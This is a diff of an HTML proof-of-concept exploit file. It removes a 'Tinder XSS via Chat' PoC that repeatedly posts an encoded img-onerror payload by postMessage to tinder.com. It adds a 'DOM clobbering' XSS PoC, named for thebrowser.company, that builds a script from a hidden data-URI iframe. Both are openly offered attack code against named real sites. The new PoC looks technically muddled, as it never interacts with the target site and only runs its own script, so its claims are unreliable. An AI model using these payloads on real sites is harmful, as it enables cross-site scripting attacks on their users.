@@ -1,28 +1,30 @@
+<!-- PoC: Remote DOM XSS via DOM Clobbering (thebrowser.company) -->
 <!DOCTYPE html>
 <html>
-  <head><title>PoC - Tinder XSS via Chat Context</title></head>
-  <body>
-    <button onclick="exploit()">🚀 Exploit XSS via Chat</button>
-    <script>
-      function exploit() {
-        const win = window.open("https://tinder.com/app/recs");  // أو صفحة دردشة مباشرة
+<head>
+  <title>Remote DOM XSS - thebrowser.company</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h2>PoC: Remote DOM XSS Exploit</h2>
+  <p>If this page triggers an alert, the target site is vulnerable to DOM XSS via iframe clobbering.</p>
 
-        const payload = {
-          content: `<img src=x onerror=alert(document.domain)>`
-        };
-        const encoded = btoa(JSON.stringify(payload));
+  <!-- Hidden iframe with DOM clobbering setup -->
+  <iframe 
+    id="my_script" 
+    name="src" 
+    src="data:text/javascript,alert('Remote DOM XSS!')"
+    style="display: none">
+  </iframe>
 
-        const trySend = () => {
-          console.log("🚀 Sending...");
-          win.postMessage(encoded, "*");
-        };
+  <script>
+    // Reference iframe by ID (clobbering)
+    window.my_script = document.getElementById("my_script");
 
-        // كرر الإرسال كل ثانيتين (في حال لم يظهر العنصر فورًا)
-        const interval = setInterval(trySend, 2000);
-        
-        // أوقف الإرسال بعد 30 ثانية
-        setTimeout(() => clearInterval(interval), 30000);
-      }
-    </script>
-  </body>
+    // Create <script> element whose src points to the iframe.src
+    var s = document.createElement("script");
+    s.src = my_script.src; // Will point to data:text/javascript,...
+    document.body.appendChild(s);
+  </script>
+</body>
 </html>
